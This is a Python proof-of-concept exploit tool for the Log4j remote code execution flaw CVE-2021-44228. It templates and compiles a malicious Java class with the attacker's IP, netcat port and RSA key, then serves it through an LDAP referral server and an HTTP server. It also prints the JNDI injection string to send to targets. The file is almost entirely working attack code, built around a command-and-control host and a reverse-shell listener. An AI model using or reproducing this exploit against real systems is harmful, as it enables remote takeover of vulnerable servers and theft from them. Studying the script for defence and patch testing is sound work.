#!/usr/bin/env python3
import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

FILE_FOLDER = Path(__file__).parent.resolve()
JAVA_BIN = os.path.join('jdk1.8.0_181', 'bin')
JAVA = 'java'
JAVAC = 'javac'
LDAP_SERVER_JAR = os.path.join('target', 'marshalsec-0.0.3-SNAPSHOT-all.jar')
LDAP_CLASS = 'marshalsec.jndi.LDAPRefServer'
RSA_KEYS = FILE_FOLDER.joinpath('RSA_KEYS')

parser = argparse.ArgumentParser(description='This is a proof of concept script to exploit log4j RCE vulnerability')
parser.add_argument('--ip', metavar='ip', type=str, 
    default='localhost', help='Command and control server IP')

parser.add_argument('--port', metavar='port', type=int,
    default='8000', help='HTTP listener port')

parser.add_argument('--ncport', metavar='ncport', type=int,
    default='9001', help='Netcat port')

parser.add_argument('src', metavar='src', type=str, 
    default=os.path.join(FILE_FOLDER, 'attacker', 'exploit'), help='File containing the source malicious code')

REGEX_FLAGS = {
    'ip': '__ip__',
    'port': '__port__',
    'public_key': '__public.key__',
    'private_key': '__private.key__'
}

def generate_payload(ip: str, ncport: int, src: str) -> None:
    print(f'{Fore.YELLOW}Loading malicious code file {src}')

    with open(RSA_KEYS.joinpath('public.key').absolute(), 'r') as f:
        public_key = f.read().replace('\n', '')

    program = ''
    with open(src, 'r') as f:
        for line in f.readlines():
            line = line.replace(REGEX_FLAGS['ip'], ip)
            line = line.replace(REGEX_FLAGS['port'], str(ncport))
            line = line.replace(REGEX_FLAGS['public_key'], public_key)
            program += line

    program_name = src.split(os.sep)[-1]
    p = Path(program_name)

    try:
        p.write_text(program)
        subprocess.run([os.path.join(FILE_FOLDER, JAVA_BIN, JAVAC), str(p)])
    except OSError as e:
        print(f'{Fore.RED}[-] Something went wrong {e}')
        raise e
    else:
        print(f'{Fore.GREEN}[+] {program_name} class created success')
    
    return program_name


def setup(ip: str, port: int, ncport: int, src: str) -> None:
    program_name = generate_payload(ip, ncport, src)
    print(f'{Fore.GREEN}[+] Setting up LDAP server\n')

    # create the LDAP server on new thread
    class_name = program_name.split('.')[0]
    t1 = threading.Thread(target=ldap_server, args=(ip, port, class_name))
    t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {port} http://0.0.0.0:{port}")
    httpd = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def check_java() -> bool:
    try:
        subprocess.call([
            os.path.join(FILE_FOLDER, JAVA_BIN, JAVA),
            '-version',
        ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        return 1
    except:
        return 0


def ldap_server(ip: str, ncport: int, class_name: str) -> None:
    sendme = '${jndi:ldap://%s:1389/a}' % (ip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = f'http://{ip}:{ncport}/#{class_name}'
    subprocess.run([
        os.path.join(FILE_FOLDER, JAVA_BIN, JAVA),
        "-cp",
        os.path.join(FILE_FOLDER, LDAP_SERVER_JAR),
        LDAP_CLASS,
        url,
    ])


def main(args) -> None:
    init(autoreset=True)
    print(f'{Fore.BLUE}[!] CVE: CVE-2021-44228')
    print(f'{Fore.BLUE}[!] Log4j vulnerability POC tool')

    try:
        if not check_java():
            print(f'{Fore.RED}[-] Java is not installed inside the repository')
            raise SystemExit(1)
        setup(args.ip, args.port, args.ncport, args.src)
    except KeyboardInterrupt:
        print(f'{Fore.RED}program interrupted')
        raise SystemExit(0)


if __name__ == "__main__":
    main(parser.parse_args())